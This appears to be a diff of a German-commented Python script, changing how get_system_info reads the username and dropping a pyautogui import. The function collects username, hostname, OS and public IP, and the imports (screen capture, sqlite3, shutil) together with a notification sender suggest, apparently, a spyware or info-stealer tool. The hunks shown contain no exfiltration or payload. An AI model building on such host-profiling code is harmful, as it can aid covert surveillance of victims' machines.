@@ -7,7 +7,6 @@ import base64
 import mss
 from PIL import Image
 import io
-import pyautogui
 import platform
 import sqlite3
 import shutil
@@ -79,8 +78,13 @@ def send_ntfy_notification():
 
 def get_system_info():
     try:
+        # Windows: os.getlogin() kann in manchen Umgebungen fehlschlagen
+        try:
+            user = os.getlogin()
+        except Exception:
+            user = os.environ.get("USERNAME") or os.environ.get("USER") or "Unbekannt"
         info = {
-            "Benutzer": os.getlogin() if hasattr(os, "getlogin") else "Unbekannt",
+            "Benutzer": user,
             "Hostname": socket.gethostname(),
             "OS": platform.platform(),
             "Öffentliche IP": get_public_ip(),
